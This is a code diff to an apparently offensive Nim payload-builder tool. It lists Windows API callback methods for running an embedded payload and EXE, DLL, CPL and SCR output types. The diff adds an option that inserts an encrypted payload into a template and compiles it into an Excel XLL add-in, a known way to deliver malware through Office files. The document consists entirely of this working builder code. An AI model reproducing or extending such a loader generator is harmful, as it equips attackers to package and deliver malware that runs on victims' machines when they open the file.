@@ -65,7 +65,8 @@ echo "CryptEnumOIDInfo [cryptenum]\n"
 echo "EnumDisplayMonitors [enumdisplay]\n"
 echo "CertEnumSystemStore [enumsystemstore]\n"
 echo "EnumDesktopWindows [enumdesktop]\n"
-echo "EnumTimeFormatsEx [enumtime]\n\n"
+echo "EnumTimeFormatsEx [enumtime]\n"
+echo "Excel XLL [excel]\n\n"
 
 echo "File types currently available:\n"
 echo "EXE, DLL, CPL, SCR\n\n"
@@ -344,10 +345,23 @@ proc main() =
         let replacement_new = "REPLACE_ME"
         file_target = file_target.replace(placeholder_new, replacement_new)
         file_path.writeFile(file_target)
-        
-    #elif    
-    else:
-        echo "Error, didn't run API call compilation."
+    if apiMethod == "excel": 
+        let file_path = ".\\apiMethods\\ExcelXLL\\ExcelXLL.nim"
+        var file_target = file_path.readFile()
+        let placeholder = "REPLACE_ME"
+        let replacement =  encodedCrypted
+        file_target = file_target.replace(placeholder, replacement)
+        file_path.writeFile(file_target) #current issue! If you need to remake payload, you need to put the placeholder BACK into the file. Only takes a second but is annoying...
+        if fileType == "dll":
+            discard execShellCmd("nim c -d=mingw --app=lib --nomain --cpu=amd64 --out:Excel.xll .\\apiMethods\\ExcelXLL\\ExcelXLL.nim")
+        else:
+            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
+        #put it back!!
+        let placeholder_new = encodedCrypted
+        let replacement_new = "REPLACE_ME"
+        file_target = file_target.replace(placeholder_new, replacement_new)
+        file_path.writeFile(file_target)
+
 
 
 
